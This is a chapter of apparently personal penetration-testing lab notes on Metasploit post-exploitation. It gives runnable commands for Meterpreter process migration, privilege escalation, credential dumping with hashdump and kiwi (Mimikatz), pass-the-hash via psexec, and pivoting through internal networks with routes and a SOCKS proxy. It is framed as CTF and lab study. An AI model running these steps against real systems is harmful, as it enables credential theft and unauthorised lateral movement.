\chapter{Post-Exploitation \& Pivoting}
\label{ch:post_exploitation}

Getting a shell is not the end --- it is the beginning. Post-exploitation is
everything that happens after access is gained: maintaining access, escalating
privileges, extracting credentials, and moving laterally through the network.

% ─────────────────────────────────────────────────────────────────────────────
\section{Post-Exploitation Priorities}
\label{sec:post_priorities}

After getting a Meterpreter session, I always work through these in order:

\begin{enumerate}
  \item \textbf{Stabilise} --- migrate to a stable process so the session does
        not die
  \item \textbf{Identify} --- confirm who I am and what system I am on
  \item \textbf{Escalate} --- attempt privilege escalation to SYSTEM or root
  \item \textbf{Persist} --- establish persistence if the engagement requires it
  \item \textbf{Credential dump} --- extract hashes and plaintext credentials
  \item \textbf{Network reconnaissance} --- understand what other systems are
        reachable from here
  \item \textbf{Lateral movement} --- use credentials/hashes to pivot to other
        systems
  \item \textbf{Objective} --- reach the target: flag, sensitive data, domain
        controller
\end{enumerate}

% ─────────────────────────────────────────────────────────────────────────────
\section{Process Migration}
\label{sec:process_migration}

Meterpreter runs inside a process. If that process is killed (e.g., the user
closes the application), the session dies. Migrating into a system process
makes the session persistent and stable.

\begin{termbox}
# List all running processes
ps

# Find a stable target process (svchost.exe, explorer.exe, lsass.exe)
pgrep svchost

# Migrate into the process
migrate <PID>

# Confirm migration succeeded
getpid
getuid
\end{termbox}

\begin{notebox}
Migrating into \ic{lsass.exe} gives access to credential material but is risky ---
if lsass crashes, the system reboots. Prefer \ic{svchost.exe} for stability.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Privilege Escalation}
\label{sec:priv_esc}

\begin{termbox}
# Attempt automatic privilege escalation
getsystem

# Check current privilege level
getuid
# Look for: NT AUTHORITY\SYSTEM (Windows) or root (Linux)

# If getsystem fails, look for local privilege escalation exploits
# Check the OS version first
sysinfo
# Then search for local exploits matching the version
search type:local platform:windows

# Common local privilege escalation modules
use post/multi/recon/local_exploit_suggester
set SESSION session_number
run
# This lists exploits likely to work based on the current session context
\end{termbox}

\screenshot{assets/images/Screenshot_2025-08-25_at_12.56.45_AM.png}{Local exploit suggester output showing applicable privilege escalation paths}

% ─────────────────────────────────────────────────────────────────────────────
\section{Credential Dumping}
\label{sec:cred_dump}

\begin{termbox}
# SAM database hash dump (requires SYSTEM)
hashdump
# Output format: username:RID:LM_hash:NTLM_hash:::

# Load kiwi (Mimikatz in Metasploit) --- requires migration to stable process
load kiwi
creds_all             # All credential types from memory
lsa_dump_sam          # SAM database hashes
lsa_dump_secrets      # LSA secrets (service account passwords, etc.)

# Pass-the-hash attack using dumped NTLM hash
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM_hash_here
set RHOST next_target_ip
exploit
\end{termbox}

\screenshot{assets/images/Screenshot_2025-12-15_at_6.04.39_AM.png}{hashdump output showing SAM database hashes}

\screenshot{assets/images/Screenshot_2025-12-15_at_6.05.52_AM.png}{kiwi creds\_all dumping plaintext credentials from memory}

% ─────────────────────────────────────────────────────────────────────────────
\section{Network Reconnaissance from Meterpreter}
\label{sec:post_net_recon}

Once inside a machine, I map what else is reachable from that host. This is the
foundation of pivoting.

\begin{termbox}
# Network interfaces on the compromised host
ipconfig              # Windows
ifconfig              # Linux

# ARP table --- recently connected hosts
arp -a

# Routing table --- what networks are accessible
route

# Active network connections
netstat -ano          # Windows
netstat -antp         # Linux

# Port scan the internal network from Meterpreter
run arp_scanner -r 192.168.x.0/24     # Find live hosts on internal network
\end{termbox}

\screenshot{assets/images/Screenshot_2025-12-15_at_6.21.27_AM.png}{ipconfig and arp showing internal network reachable from compromised host}

% ─────────────────────────────────────────────────────────────────────────────
\section{Pivoting}
\label{sec:pivoting}

Pivoting means using a compromised machine as a relay to reach systems that are
not directly accessible from the attacker machine. This is how attackers move
from an internet-facing server into an internal corporate network.

\begin{termbox}
# Add a route through the Meterpreter session
# (access 192.168.2.0/24 through session 1)
route add 192.168.2.0/24 1
route print

# Alternatively, use the autoroute post module
use post/multi/manage/autoroute
set SESSION 1
run

# Once route is added, scan the internal network through the pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.0/24
set PORTS 22,80,445,3389
run

# SOCKS proxy for routing all Metasploit traffic through the pivot
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run &
# Configure proxychains to use 127.0.0.1:1080
# Then use proxychains with any tool: proxychains nmap 192.168.2.1
\end{termbox}

\screenshot{assets/images/Screenshot_2025-12-15_at_6.27.38_AM.png}{Meterpreter route added through compromised host to internal network}

% ─────────────────────────────────────────────────────────────────────────────
\section{Finding Flags --- Post-Exploitation}
\label{sec:finding_flags}

In CTF and lab environments, the objective is usually a flag file. These are
the quickest ways to find it:

\begin{termbox}
# Windows (Meterpreter)
cd /
ls                           # Check root of C:\
search -f flag.txt           # Search entire file system for flag.txt
cat flag.txt

# Linux (shell session)
find / -name "flag" 2>/dev/null
find / -name "flag.txt" 2>/dev/null
cat /flag
cat /root/flag.txt
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Learning Output}

\begin{takebox}
\textbf{What I Learned}
\begin{itemize}
  \item Post-exploitation is a methodology, not just running commands. Following
        the priority order (stabilise $\rightarrow$ identify $\rightarrow$
        escalate $\rightarrow$ dump $\rightarrow$ pivot) stops me from missing
        steps.
  \item The local exploit suggester (\ic{post/multi/recon/local\_exploit\_suggester})
        saved me hours of manual research. It reads the session context and tells
        me what privilege escalation exploits are likely to work.
  \item ARP table is gold. It shows me what hosts the compromised machine has
        been talking to --- those are the next targets.
  \item Pass-the-hash is often more reliable than cracking. NTLM hashes from
        hashdump work directly in PsExec without needing the plaintext password.
\end{itemize}

\textbf{Enumeration Mindset --- After Getting a Session}
\begin{enumerate}
  \item Migrate to stable process immediately
  \item \ic{sysinfo} + \ic{getuid} to understand context
  \item \ic{getsystem} for privilege escalation
  \item \ic{hashdump} or \ic{creds\_all} for credentials
  \item \ic{ipconfig} + \ic{arp} for network map
  \item Route through session for internal access
  \item Find the flag
\end{enumerate}

\textbf{Common Mistakes}
\begin{itemize}
  \item Running hashdump without SYSTEM privileges --- it fails silently or
        returns partial results
  \item Not using the local exploit suggester before spending time manually
        testing privilege escalation techniques
  \item Forgetting to add a route before trying to scan the internal network ---
        the scan runs on the wrong interface and returns nothing
  \item Closing sessions instead of backgrounding them
\end{itemize}

\textbf{Real-World Impact}
\begin{itemize}
  \item One compromised internet-facing server + pivoting = full internal network
        access
  \item Credential dump from one machine often unlocks dozens of other machines
        in the same domain (password reuse is epidemic)
  \item Pass-the-hash means cracking is not required --- hashes work directly
\end{itemize}
\end{takebox}
